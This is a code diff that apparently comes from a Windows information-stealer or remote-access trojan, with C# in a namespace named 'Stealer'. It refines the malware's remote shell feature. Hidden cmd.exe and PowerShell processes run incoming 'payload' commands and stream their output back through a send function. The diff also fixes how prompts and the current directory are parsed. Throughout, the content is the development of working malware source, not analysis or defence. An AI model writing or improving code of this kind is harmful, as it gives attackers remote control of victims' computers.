@@ -198,7 +198,15 @@ namespace Stealer
             {
                 if (e.Data == null) return;
                 if (!_cmdStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _cmdReady.Set(); return; }
-                // cmd prompt "C:\path>" may be prepended to the line (no trailing newline from prompt)
+                // Strip cmd prompt prefix ("C:\path>") that gets prepended without newline
+                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^[A-Za-z]:\\[^>]*>", "");
+                if (!string.IsNullOrEmpty(line))
+                    SendShellLine("shell_out", line, "cmd", "");
+            };
+            _cmdShell.ErrorDataReceived += (s, e) =>
+            {
+                if (!_cmdStreaming || e.Data == null) return;
+                // CWD sentinel arrives via stderr (stdout stays clean)
                 int cwdIdx = e.Data.IndexOf(SHELL_CWD);
                 if (cwdIdx >= 0)
                 {
@@ -207,15 +215,7 @@ namespace Stealer
                     SendShellLine("shell_done", "", "cmd", cwd);
                     return;
                 }
-                // Strip cmd prompt prefix e.g. "C:\Windows>" from display output
-                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^[A-Za-z]:\\[^>]*>", "");
-                if (!string.IsNullOrEmpty(line))
-                    SendShellLine("shell_out", line, "cmd", "");
-            };
-            _cmdShell.ErrorDataReceived += (s, e) =>
-            {
-                if (_cmdStreaming && e.Data != null)
-                    SendShellLine("shell_out", e.Data, "cmd", "");
+                SendShellLine("shell_out", e.Data, "cmd", "");
             };
             _cmdShell.BeginOutputReadLine();
             _cmdShell.BeginErrorReadLine();
@@ -238,7 +238,7 @@ namespace Stealer
                 {
                     lock (_cmdLock) { EnsureCmdShell(); }
                     _cmdShell.StandardInput.WriteLine(payload);
-                    _cmdShell.StandardInput.WriteLine("echo " + SHELL_CWD + "%CD%");
+                    _cmdShell.StandardInput.WriteLine("@echo " + SHELL_CWD + "%CD% >&2");
                     _cmdShell.StandardInput.Flush();
                 }
                 catch (Exception ex)
@@ -275,6 +275,13 @@ namespace Stealer
             {
                 if (e.Data == null) return;
                 if (!_psStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _psReady.Set(); return; }
+                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^PS [A-Za-z]:\\[^>]*>", "");
+                if (!string.IsNullOrEmpty(line))
+                    SendShellLine("shell_out", line, "ps", "");
+            };
+            _psShell.ErrorDataReceived += (s, e) =>
+            {
+                if (!_psStreaming || e.Data == null) return;
                 int cwdIdx = e.Data.IndexOf(SHELL_CWD);
                 if (cwdIdx >= 0)
                 {
@@ -283,15 +290,7 @@ namespace Stealer
                     SendShellLine("shell_done", "", "ps", cwd);
                     return;
                 }
-                // Strip PS prompt prefix "PS C:\path>"
-                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^PS [A-Za-z]:\\[^>]*>", "");
-                if (!string.IsNullOrEmpty(line))
-                    SendShellLine("shell_out", line, "ps", "");
-            };
-            _psShell.ErrorDataReceived += (s, e) =>
-            {
-                if (_psStreaming && e.Data != null)
-                    SendShellLine("shell_out", e.Data, "ps", "");
+                SendShellLine("shell_out", e.Data, "ps", "");
             };
             _psShell.BeginOutputReadLine();
             _psShell.BeginErrorReadLine();
@@ -313,7 +312,7 @@ namespace Stealer
                 {
                     lock (_psLock) { EnsurePsShell(); }
                     _psShell.StandardInput.WriteLine(payload);
-                    _psShell.StandardInput.WriteLine("Write-Host ('" + SHELL_CWD + "' + (Get-Location).Path)");
+                    _psShell.StandardInput.WriteLine("[Console]::Error.WriteLine('" + SHELL_CWD + "' + (Get-Location).Path)");
                     _psShell.StandardInput.Flush();
                 }
                 catch (Exception ex)
